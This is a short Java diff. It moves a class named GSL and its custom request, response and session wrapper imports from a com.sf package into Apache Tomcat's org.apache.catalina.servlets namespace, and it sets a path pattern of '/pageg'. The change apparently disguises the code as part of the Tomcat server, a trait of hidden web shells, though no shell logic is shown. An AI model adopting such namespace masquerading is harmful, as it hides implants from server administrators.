@@ -1,9 +1,9 @@
-package com.sf.sl;
+package org.apache.catalina.servlets.sl;
 
-import com.sf.redefine.MyRequest;
-import com.sf.redefine.MyResponse;
-import com.sf.redefine.MyServletOutputStream;
-import com.sf.redefine.MySession;
+import org.apache.catalina.servlets.redefine.MyRequest;
+import org.apache.catalina.servlets.redefine.MyResponse;
+import org.apache.catalina.servlets.redefine.MyServletOutputStream;
+import org.apache.catalina.servlets.redefine.MySession;
 
 public class GSL {
     private static final String pathPattern= "/pageg";
